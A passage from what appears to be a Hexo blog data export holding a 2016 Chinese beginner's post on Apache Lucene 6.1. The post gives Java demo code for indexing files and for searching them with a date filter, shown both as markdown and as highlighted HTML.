the file tree ************//\n\tstatic void indexDocs(final IndexWriter writer, Path path) throws IOException {\n\t\tif (Files.isDirectory(path)) {\n\t\t\tFiles.walkFileTree(path, new SimpleFileVisitor<Path>() {\n\t\t\t\t@Override\n\t\t\t\tpublic FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tindexDoc(writer, file, attrs.lastModifiedTime().toMillis());\n\t\t\t\t\t} catch (IOException ignore) {\n\t\t\t\t\t}\n\t\t\t\t\treturn FileVisitResult.CONTINUE;\n\t\t\t\t}\n\t\t\t});\n\t\t} else {\n\t\t\tindexDoc(writer, path, Files.getLastModifiedTime(path).toMillis());\n\t\t}\n\t}\n\t\n\t//******** Index single document ********//\n\tstatic void indexDoc(IndexWriter writer, Path file, long lastModified) throws IOException {\n\t\ttry (InputStream stream = Files.newInputStream(file)) {\n\t\t\tDocument doc = new Document();\n\t\t\t//*********** title ************//\n\t\t\tField titleField = new StringField(\"title\", file.getFileName().toString(), Field.Store.YES);\n\t\t\tdoc.add(titleField);\n\t\t\t//************ path ************//\n\t\t\tField pathField = new StringField(\"path\", file.toString(), Field.Store.YES);\n\t\t\tdoc.add(pathField);\n\t\t\t//******* last modify time ******//\n\t\t\tdoc.add(new LongPoint(\"modified\", lastModified));\n\t\t\t//******** content ********//\n\t\t\tdoc.add(new TextField(\"contents\", new BufferedReader(new InputStreamReader(stream, StandardCharsets.UTF_8))));\n\t\t\tif (writer.getConfig().getOpenMode() == OpenMode.CREATE) {\n\t\t\t\twriter.addDocument(doc);\n\t\t\t} else {\n\t\t\t\twriter.updateDocument(new Term(\"path\", file.toString()), doc);\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n### 检索文件\n``` java\n//*SearchFiles.java*//\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.Date;\n\nimport org.apache.lucene.analysis.Analyzer;\nimport org.apache.lucene.analysis.standard.StandardAnalyzer;\nimport org.wltea.analyzer.lucene.IKAnalyzer;\nimport org.apache.lucene.analysis.cn.smart.SmartChineseAnalyzer;\nimport org.apache.lucene.document.Document;\nimport org.apache.lucene.index.DirectoryReader;\nimport org.apache.lucene.index.IndexReader;\nimport org.apache.lucene.queryparser.classic.ParseException;\nimport org.apache.lucene.queryparser.classic.QueryParser;\nimport org.apache.lucene.search.IndexSearcher;\nimport org.apache.lucene.search.Query;\nimport org.apache.lucene.search.ScoreDoc;\nimport org.apache.lucene.search.TopDocs;\nimport org.apache.lucene.store.FSDirectory;\n\npublic class SearchFiles {\n\tString indexPath;\n\tint repeat = 0;\n\tboolean raw = false;\n\tAnalyzer analyzer;\n\tint hitsPerPage = 300;\n\t\n\tpublic SearchFiles(String indexPath) throws Exception {\n\t\tthis.indexPath = indexPath;\n\t\tanalyzer = new SmartChineseAnalyzer();\n\t}\n\n\tpublic String[][] query(String time0, String time1, String queryString, String field) throws IOException, ParseException{\n\t\tIndexReader reader = DirectoryReader.open(FSDirectory.open(Paths.get(indexPath)));\n\t\tIndexSearcher searcher = new IndexSearcher(reader);\n\n\t\tBufferedReader in = new BufferedReader(new InputStreamReader(System.in, StandardCharsets.UTF_8));\n\t\tQueryParser parser = new QueryParser(field, analyzer);\n\n\t\tif (queryString == null || queryString.length() == -1) {\n\t\t\tnew Exception(\"查询不能为空!\");\n\t\t}\n\t\tqueryString = queryString.trim();\n\t\tif (queryString.length() == 0) {\n\t\t\tnew Exception(\"查询不能为空格!\");\n\t\t}\n\n\t\tQuery query = parser.parse(queryString);\n\t\tSystem.out.println(\"...Searching for: \" + query.toString(field));\n\n\t\tif (repeat > 0) {                      // repeat & time as benchmark\n\t\t\tDate start = new Date();\n\t\t\tfor (int i = 0; i < repeat; i++) {\n\t\t\t\tsearcher.search(query,100);\n\t\t\t}\n\t\t\tDate end = new Date();\n\t\t\tSystem.out.println(\"Time: \"+(end.getTime()-start.getTime())+\"ms\");\n\t\t}\n\n\t\tScoreDoc[] hits = doPagingSearch(in, searcher, query, hitsPerPage, raw, queryString == null);\n\t\tString[][] result = new String[hitsPerPage > hits.length ? hits.length :hitsPerPage][3];\n\t\t\n\t\tint index = -1;\n\t\tfor(int i=0; i < hits.length && index < hitsPerPage-1 ;++i) \n\t\t{\n\t\t\tint docId = hits[i].doc;\n\t\t\tDocument d = searcher.doc(docId);\n\t\t\tString p = d.get(\"path\");\n\t\t\t// judge if the doc is to choose\n\t\t\tboolean fin = false;\n\t\t\tSystem.out.println(p.charAt(13) +\" \"+ time0.charAt(3) +\" \"+ time1.charAt(3));\n\t\t\tif(p.charAt(13)>=time0.charAt(3) && p.charAt(13)<=time1.charAt(3))\n\t\t\t{\n\t\t\t\tint tm0 = (time0.charAt(5) - '0')*10 + (time0.charAt(6) - '0');\n\t\t\t\tint tm1 = (time1.charAt(5) - '0')*10 + (time1.charAt(6) - '0');\n\t\t\t\tint m = (p.charAt(15) - '0')*10 + (p.charAt(16) - '0');\n\t\t\t\tif(m >= tm0 && m <=tm1)\n\t\t\t\t{\n\t\t\t\t\tint td0 = (time0.charAt(8) - '0')*10 + (time0.charAt(9) - '0');\n\t\t\t\t\tint td1 = (time1.charAt(8) - '0')*10 + (time1.charAt(9) - '0');\n\t\t\t\t\tint day = (p.charAt(18) - '0')*10 + (p.charAt(19) - '0');\n\t\t\t\t\tif(tm0 < tm1 && m == tm0 && day >= td0) fin = true;\n\t\t\t\t\tif(tm0 < tm1 && m == tm1 && day <= td1) fin = true;\n\t\t\t\t\tif(m > tm0 && m < tm1) fin = true; \n\t\t\t\t\tif(m == tm0 && m == tm1)\n\t\t\t\t\t\tif(day >= td0 && day <= td1) fin = true;\n\t\t\t\t}\n\t\t\t}\n\t\t\tSystem.out.println(\"fin: \"+fin); // for debug use\n\t\t\tif(fin){\n\t\t\t\tresult[index+1][0] = \"\"+(index+2);\n\t\t\t\tresult[index+1][1] = d.get(\"title\");\n\t\t\t\tresult[index+1][2] = p.substring(10,20);\n\t\t\t\tSystem.out.println(d.get(\"path\")); // for debug use\n\t\t\t\tindex += 1;\n\t\t\t}\n\t\t}\n\t\treader.close();\n\t\tif(index == -1) {new Exception(\"查询无果!\");}\n\t\treturn result;\n\t}\n\n\tprivate ScoreDoc[] doPagingSearch(BufferedReader in, IndexSearcher searcher, Query query, \n\t\t\tint hitsPerPage, boolean raw, boolean interactive) throws IOException {\n\t\t// Collect enough docs to show 5 pages\n\t\tTopDocs results = searcher.search(query, 5 * hitsPerPage);\n\t\tScoreDoc[] hits = results.scoreDocs;\n\t\tint numTotalHits = results.totalHits;\n\t\tSystem.out.println(numTotalHits + \" total matching documents\");\n\t\treturn hits;\n\t}\n}\n\n```\n关键处代码都写有注释，相信有了[代码馆 Lucene6.0实战](http://codepub.cn/2016/05/20/Lucene-6-0-in-action-1-Index-creation/)博文的基础，也不难理解。\n\n### 运行效果\n\n![img](/images/in-post/post-blog-Lucene.png)\n\n### 完整src见[Github](https://github.com/miyunluo/Lucene6.1-demo)\n\n-- miyunluo 于2016.10\n","source":"_posts/2016-10-12-Lucene.markdown","raw":"---\nlayout:     post\ntitle:      \"Lucene6.1初级笔记与Demo\"\ntags:\n    - Lucene\n---\n\n> “似乎什么也没写”\n\n\n## 前言\n\n暑期参加了一个只有三个人的宏大项目，一个人写爬虫，一个人写Lucene，一个我也不知道做了什么。很不凑巧，我就是写Lucene的那个。之前基本没写过java，Lucene也是第一次接触，不过也算是短时间内完成了，功能上比较简陋。今天刚结束了这个项目莫名其妙的一个答辩，写点基础的，给那些像我一样刚刚接触的同学。\n\n---\n\n## 正文\n\nLucene是一个全文检索框架，功能异常强大，可以进行精确模糊查询还有一些高级的查询功能，其主要功能分为两大部分：索引（index）和查询（search）虽然无法与Google的搜索引擎媲美，但是作为一个开源框架，其可定制性极高，可以满足特定方面的检索需求。\n\nLucene的介绍文档很多，但是都比较陈旧，有关最新6.0+版本的Lucene介绍，可以参考[代码馆 Lucene6.0实战](http://codepub.cn/2016/05/20/Lucene-6-0-in-action-1-Index-creation/)，介绍的十分基础也十分详细，有样例与运行结果，对照学习效果十分好。\n\n当然，你也许会有这种感觉，看完了[代码馆 Lucene6.0实战](http://codepub.cn/2016/05/20/Lucene-6-0-in-action-1-Index-creation/)的博文似乎还是无法下手做出什么东西来，在这里给出一个demo，供初次接触lucene的同学参考。\n\n\n\n### 建立索引\n``` java\n//*IndexFiles.java*//\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.FileVisitResult;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.SimpleFileVisitor;\nimport java.nio.file.attribute.BasicFileAttributes;\nimport java.util.Date;\n\nimport org.apache.lucene.analysis.Analyzer;\nimport org.apache.lucene.analysis.TokenStream;\nimport org.apache.lucene.analysis.Tokenizer;\nimport org.apache.lucene.analysis.core.LowerCaseFilter;\nimport org.apache.lucene.analysis.core.StopFilter;\nimport org.apache.lucene.analysis.en.PorterStemFilter;\nimport org.apache.lucene.analysis.en.PorterStemFilterFactory;\nimport org.apache.lucene.analysis.cn.smart.SmartChineseAnalyzer;\nimport org.apache.lucene.analysis.standard.StandardFilterFactory;\nimport org.apache.lucene.analysis.standard.StandardTokenizer;\nimport org.apache.lucene.document.LongPoint;\nimport org.apache.lucene.document.Document;\nimport org.apache.lucene.document.Field;\nimport org.apache.lucene.document.StringField;\nimport org.apache.lucene.document.TextField;\nimport org.apache.lucene.index.IndexWriter;\nimport org.apache.lucene.index.IndexWriterConfig.OpenMode;\nimport org.apache.lucene.index.IndexWriterConfig;\nimport org.apache.lucene.index.Term;\nimport org.apache.lucene.store.Directory;\nimport org.apache.lucene.store.FSDirectory;\nimport org.apache.lucene.util.Version;\nimport org.tartarus.snowball.ext.PorterStemmer;\n\n\npublic class IndexFiles {\n\n\tpublic IndexFiles(String indexDestiny, String documentsPath){\n\t\tboolean create = true;\n\t\t//******** find the document_path *********//\n\t\tfinal Path docDir = Paths.get(documentsPath);\n\t\tif (!Files.isReadable(docDir)) {\n\t\t\tSystem.out.println(\"Document directory '\" +docDir.toAbsolutePath()+ \"' does not exist or is not readable, please check the path\");\n\t\t\tSystem.exit(1);\n\t\t}\n\n\t\tDate start = new Date();\n\t\ttry {\n\t\t\tSystem.out.println(\"Indexing to directory '\" + indexDestiny + \"'...\");\n\n\t\t\tDirectory dir = FSDirectory.open(Paths.get(indexDestiny));      \n\t\t\tAnalyzer analyzer = new SmartChineseAnalyzer();\n\t\t\tIndexWriterConfig iwc = new IndexWriterConfig(analyzer);\n\n\t\t\tif (create) {\n\t\t\t\tiwc.setOpenMode(OpenMode.CREATE);\n\t\t\t} else {\n\t\t\t\tiwc.setOpenMode(OpenMode.CREATE_OR_APPEND);\n\t\t\t}\n\t\t\t//******** construct an IndexWriter *******//\n\t\t\tIndexWriter writer = new IndexWriter(dir, iwc);\n\t\t\tindexDocs(writer, docDir);\n\t\t\twriter.close();\n\t\t\tDate end = new Date();\n\t\t\t//*********** calculate the time **********//\n\t\t\tSystem.out.println(end.getTime() - start.getTime() + \" total milliseconds\");\n\n\t\t} catch (IOException e) {\n\t\t\tSystem.out.println(\" caught a \" + e.getClass() +\n\t\t\t\t\t\"\\n with message: \" + e.getMessage());\n\t\t}\n\t}\n\t//*********** traverse the file tree ************//\n\tstatic void indexDocs(final IndexWriter writer, Path path) throws IOException {\n\t\tif (Files.isDirectory(path)) {\n\t\t\tFiles.walkFileTree(path, new SimpleFileVisitor<Path>() {\n\t\t\t\t@Override\n\t\t\t\tpublic FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tindexDoc(writer, file, attrs.lastModifiedTime().toMillis());\n\t\t\t\t\t} catch (IOException ignore) {\n\t\t\t\t\t}\n\t\t\t\t\treturn FileVisitResult.CONTINUE;\n\t\t\t\t}\n\t\t\t});\n\t\t} else {\n\t\t\tindexDoc(writer, path, Files.getLastModifiedTime(path).toMillis());\n\t\t}\n\t}\n\t\n\t//******** Index single document ********//\n\tstatic void indexDoc(IndexWriter writer, Path file, long lastModified) throws IOException {\n\t\ttry (InputStream stream = Files.newInputStream(file)) {\n\t\t\tDocument doc = new Document();\n\t\t\t//*********** title ************//\n\t\t\tField titleField = new StringField(\"title\", file.getFileName().toString(), Field.Store.YES);\n\t\t\tdoc.add(titleField);\n\t\t\t//************ path ************//\n\t\t\tField pathField = new StringField(\"path\", file.toString(), Field.Store.YES);\n\t\t\tdoc.add(pathField);\n\t\t\t//******* last modify time ******//\n\t\t\tdoc.add(new LongPoint(\"modified\", lastModified));\n\t\t\t//******** content ********//\n\t\t\tdoc.add(new TextField(\"contents\", new BufferedReader(new InputStreamReader(stream, StandardCharsets.UTF_8))));\n\t\t\tif (writer.getConfig().getOpenMode() == OpenMode.CREATE) {\n\t\t\t\twriter.addDocument(doc);\n\t\t\t} else {\n\t\t\t\twriter.updateDocument(new Term(\"path\", file.toString()), doc);\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n### 检索文件\n``` java\n//*SearchFiles.java*//\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.Date;\n\nimport org.apache.lucene.analysis.Analyzer;\nimport org.apache.lucene.analysis.standard.StandardAnalyzer;\nimport org.wltea.analyzer.lucene.IKAnalyzer;\nimport org.apache.lucene.analysis.cn.smart.SmartChineseAnalyzer;\nimport org.apache.lucene.document.Document;\nimport org.apache.lucene.index.DirectoryReader;\nimport org.apache.lucene.index.IndexReader;\nimport org.apache.lucene.queryparser.classic.ParseException;\nimport org.apache.lucene.queryparser.classic.QueryParser;\nimport org.apache.lucene.search.IndexSearcher;\nimport org.apache.lucene.search.Query;\nimport org.apache.lucene.search.ScoreDoc;\nimport org.apache.lucene.search.TopDocs;\nimport org.apache.lucene.store.FSDirectory;\n\npublic class SearchFiles {\n\tString indexPath;\n\tint repeat = 0;\n\tboolean raw = false;\n\tAnalyzer analyzer;\n\tint hitsPerPage = 300;\n\t\n\tpublic SearchFiles(String indexPath) throws Exception {\n\t\tthis.indexPath = indexPath;\n\t\tanalyzer = new SmartChineseAnalyzer();\n\t}\n\n\tpublic String[][] query(String time0, String time1, String queryString, String field) throws IOException, ParseException{\n\t\tIndexReader reader = DirectoryReader.open(FSDirectory.open(Paths.get(indexPath)));\n\t\tIndexSearcher searcher = new IndexSearcher(reader);\n\n\t\tBufferedReader in = new BufferedReader(new InputStreamReader(System.in, StandardCharsets.UTF_8));\n\t\tQueryParser parser = new QueryParser(field, analyzer);\n\n\t\tif (queryString == null || queryString.length() == -1) {\n\t\t\tnew Exception(\"查询不能为空!\");\n\t\t}\n\t\tqueryString = queryString.trim();\n\t\tif (queryString.length() == 0) {\n\t\t\tnew Exception(\"查询不能为空格!\");\n\t\t}\n\n\t\tQuery query = parser.parse(queryString);\n\t\tSystem.out.println(\"...Searching for: \" + query.toString(field));\n\n\t\tif (repeat > 0) {                      // repeat & time as benchmark\n\t\t\tDate start = new Date();\n\t\t\tfor (int i = 0; i < repeat; i++) {\n\t\t\t\tsearcher.search(query,100);\n\t\t\t}\n\t\t\tDate end = new Date();\n\t\t\tSystem.out.println(\"Time: \"+(end.getTime()-start.getTime())+\"ms\");\n\t\t}\n\n\t\tScoreDoc[] hits = doPagingSearch(in, searcher, query, hitsPerPage, raw, queryString == null);\n\t\tString[][] result = new String[hitsPerPage > hits.length ? hits.length :hitsPerPage][3];\n\t\t\n\t\tint index = -1;\n\t\tfor(int i=0; i < hits.length && index < hitsPerPage-1 ;++i) \n\t\t{\n\t\t\tint docId = hits[i].doc;\n\t\t\tDocument d = searcher.doc(docId);\n\t\t\tString p = d.get(\"path\");\n\t\t\t// judge if the doc is to choose\n\t\t\tboolean fin = false;\n\t\t\tSystem.out.println(p.charAt(13) +\" \"+ time0.charAt(3) +\" \"+ time1.charAt(3));\n\t\t\tif(p.charAt(13)>=time0.charAt(3) && p.charAt(13)<=time1.charAt(3))\n\t\t\t{\n\t\t\t\tint tm0 = (time0.charAt(5) - '0')*10 + (time0.charAt(6) - '0');\n\t\t\t\tint tm1 = (time1.charAt(5) - '0')*10 + (time1.charAt(6) - '0');\n\t\t\t\tint m = (p.charAt(15) - '0')*10 + (p.charAt(16) - '0');\n\t\t\t\tif(m >= tm0 && m <=tm1)\n\t\t\t\t{\n\t\t\t\t\tint td0 = (time0.charAt(8) - '0')*10 + (time0.charAt(9) - '0');\n\t\t\t\t\tint td1 = (time1.charAt(8) - '0')*10 + (time1.charAt(9) - '0');\n\t\t\t\t\tint day = (p.charAt(18) - '0')*10 + (p.charAt(19) - '0');\n\t\t\t\t\tif(tm0 < tm1 && m == tm0 && day >= td0) fin = true;\n\t\t\t\t\tif(tm0 < tm1 && m == tm1 && day <= td1) fin = true;\n\t\t\t\t\tif(m > tm0 && m < tm1) fin = true; \n\t\t\t\t\tif(m == tm0 && m == tm1)\n\t\t\t\t\t\tif(day >= td0 && day <= td1) fin = true;\n\t\t\t\t}\n\t\t\t}\n\t\t\tSystem.out.println(\"fin: \"+fin); // for debug use\n\t\t\tif(fin){\n\t\t\t\tresult[index+1][0] = \"\"+(index+2);\n\t\t\t\tresult[index+1][1] = d.get(\"title\");\n\t\t\t\tresult[index+1][2] = p.substring(10,20);\n\t\t\t\tSystem.out.println(d.get(\"path\")); // for debug use\n\t\t\t\tindex += 1;\n\t\t\t}\n\t\t}\n\t\treader.close();\n\t\tif(index == -1) {new Exception(\"查询无果!\");}\n\t\treturn result;\n\t}\n\n\tprivate ScoreDoc[] doPagingSearch(BufferedReader in, IndexSearcher searcher, Query query, \n\t\t\tint hitsPerPage, boolean raw, boolean interactive) throws IOException {\n\t\t// Collect enough docs to show 5 pages\n\t\tTopDocs results = searcher.search(query, 5 * hitsPerPage);\n\t\tScoreDoc[] hits = results.scoreDocs;\n\t\tint numTotalHits = results.totalHits;\n\t\tSystem.out.println(numTotalHits + \" total matching documents\");\n\t\treturn hits;\n\t}\n}\n\n```\n关键处代码都写有注释，相信有了[代码馆 Lucene6.0实战](http://codepub.cn/2016/05/20/Lucene-6-0-in-action-1-Index-creation/)博文的基础，也不难理解。\n\n### 运行效果\n\n![img](/images/in-post/post-blog-Lucene.png)\n\n### 完整src见[Github](https://github.com/miyunluo/Lucene6.1-demo)\n\n-- miyunluo 于2016.10\n","slug":"Lucene","published":1,"date":"2016-10-11T16:00:00.000Z","updated":"2018-04-23T11:20:34.000Z","comments":1,"photos":[],"link":"","_id":"cji4qizaw0005rikeqrjgz6sk","content":"<blockquote>\n<p>“似乎什么也没写”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>暑期参加了一个只有三个人的宏大项目，一个人写爬虫，一个人写Lucene，一个我也不知道做了什么。很不凑巧，我就是写Lucene的那个。之前基本没写过java，Lucene也是第一次接触，不过也算是短时间内完成了，功能上比较简陋。今天刚结束了这个项目莫名其妙的一个答辩，写点基础的，给那些像我一样刚刚接触的同学。</p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>Lucene是一个全文检索框架，功能异常强大，可以进行精确模糊查询还有一些高级的查询功能，其主要功能分为两大部分：索引（index）和查询（search）虽然无法与Google的搜索引擎媲美，但是作为一个开源框架，其可定制性极高，可以满足特定方面的检索需求。</p>\n<p>Lucene的介绍文档很多，但是都比较陈旧，有关最新6.0+版本的Lucene介绍，可以参考<a href=\"http://codepub.cn/2016/05/20/Lucene-6-0-in-action-1-Index-creation/\" target=\"_blank\" rel=\"noopener\">代码馆 Lucene6.0实战</a>，介绍的十分基础也十分详细，有样例与运行结果，对照学习效果十分好。</p>\n<p>当然，你也许会有这种感觉，看完了<a href=\"http://codepub.cn/2016/05/20/Lucene-6-0-in-action-1-Index-creation/\" target=\"_blank\" rel=\"noopener\">代码馆 Lucene6.0实战</a>的博文似乎还是无法下手做出什么东西来，在这里给出一个demo，供初次接触lucene的同学参考。</p>\n<h3 id=\"建立索引\"><a href=\"#建立索引\" class=\"headerlink\" title=\"建立索引\"></a>建立索引</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//*IndexFiles.java*//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.BufferedReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStreamReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.charset.StandardCharsets;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.FileVisitResult;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Path;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.SimpleFileVisitor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.attribute.BasicFileAttributes;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Date;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.Analyzer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.TokenStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.Tokenizer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.core.LowerCaseFilter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.core.StopFilter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.en.PorterStemFilter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.en.PorterStemFilterFactory;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.cn.smart.SmartChineseAnalyzer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.standard.StandardFilterFactory;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.standard.StandardTokenizer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.document.LongPoint;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.document.Document;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.document.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.document.StringField;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.document.TextField;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.index.IndexWriter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.index.IndexWriterConfig.OpenMode;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.index.IndexWriterConfig;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.index.Term;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.store.Directory;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.store.FSDirectory;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.util.Version;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.tartarus.snowball.ext.PorterStemmer;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">IndexFiles</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">IndexFiles</span><span class=\"params\">(String indexDestiny, String documentsPath)</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">boolean</span> create = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t\t<span class=\"comment\">//******** find the document_path *********//</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Path docDir = Paths.get(documentsPath);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!Files.isReadable(docDir)) &#123;</span><br><span class=\"line\">\t\t\tSystem.out.println(<span class=\"string\">\"Document directory '\"</span> +docDir.toAbsolutePath()+ <span class=\"string\">\"' does not exist or is not readable, please check the path\"</span>);</span><br><span class=\"line\">\t\t\tSystem.exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tDate start = <span class=\"keyword\">new</span> Date();</span><br><span class=\"line\">\t\t<span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">\t\t\tSystem.out.println(<span class=\"string\">\"Indexing to directory '\"</span> + indexDestiny + <span class=\"string\">\"'...\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tDirectory dir = FSDirectory.open(Paths.get(indexDestiny));      </span><br><span class=\"line\">\t\t\tAnalyzer analyzer = <span class=\"keyword\">new</span> SmartChineseAnalyzer();</span><br><span class=\"line\">\t\t\tIndexWriterConfig iwc = <span class=\"keyword\">new</span> IndexWriterConfig(analyzer);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (create) &#123;</span><br><span class=\"line\">\t\t\t\tiwc.setOpenMode(OpenMode.CREATE);</span><br><span class=\"line\">\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\tiwc.setOpenMode(OpenMode.CREATE_OR_APPEND);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//******** construct an IndexWriter *******//</span></span><br><span class=\"line\">\t\t\tIndexWriter writer = <span class=\"keyword\">new</span> IndexWriter(dir, iwc);</span><br><span class=\"line\">\t\t\tindexDocs(writer, docDir);</span><br><span class=\"line\">\t\t\twriter.close();</span><br><span class=\"line\">\t\t\tDate end = <span class=\"keyword\">new</span> 